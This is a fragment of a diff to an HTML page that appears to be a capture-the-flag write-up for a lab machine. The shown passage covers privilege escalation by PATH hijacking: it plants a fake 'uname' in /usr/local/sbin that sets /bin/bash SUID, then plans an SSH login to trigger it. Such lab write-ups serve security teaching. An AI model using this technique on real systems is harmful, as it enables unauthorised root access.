@@ -110,12 +110,12 @@ drwxr-xr-x 7 root    root    4096  <span class="code-blue">share</span>
 drwxr-xr-x 2 root    root    4096  <span class="code-blue">src</span>
 </code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>The previous Bash script is running commands without the absolute path, so we are able to create malicious executable files that overwrite the legitimate ones. For example, <code>uname</code>.</p><p>The usual absolute path for <code>uname</code> is:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc_acc@late:~$ which uname  
 /bin/uname
-</code></pre></div><p>But we are creating a new <code>uname</code> executable file that will set <code>/bin/bash</code> as a SUID binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc_acc@late:~$ cat &gt; /usr/local/sbin/uname  
+</code></pre></div><p>But we are creating a new <code>uname</code> executable file that will set <code>/bin/bash</code> as a SUID binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc_acc@late:~$ cat &gt; /usr/local/sbin/uname
 #!/bin/bash
 
 chmod 4755 /bin/bash
 ^C
-svc_acc@late:~$ chmod +x /usr/local/sbin/uname
+svc_acc@late:~$ chmod +x /usr/local/sbin/uname  
 </code></pre></div><p>Since the malicious <code>uname</code> is inside <code>/usr/local/sbin</code> and this directory comes first in the <code>PATH</code> environment variable, now the command <code>uname</code> will be our new one:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc_acc@late:~$ which uname  
 /usr/local/sbin/uname
 </code></pre></div><p>We can try to access SSH and try random passwords, but the <code>ssh-alert.sh</code> script is not executed, and so <code>/bin/bash</code> is not SUID yet.</p><p>Hence, we can guess that we need to log in successfully. For that, we see that <code>svc_acc</code> has a <code>.ssh</code> directory:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc_acc@late:~$ ls -la
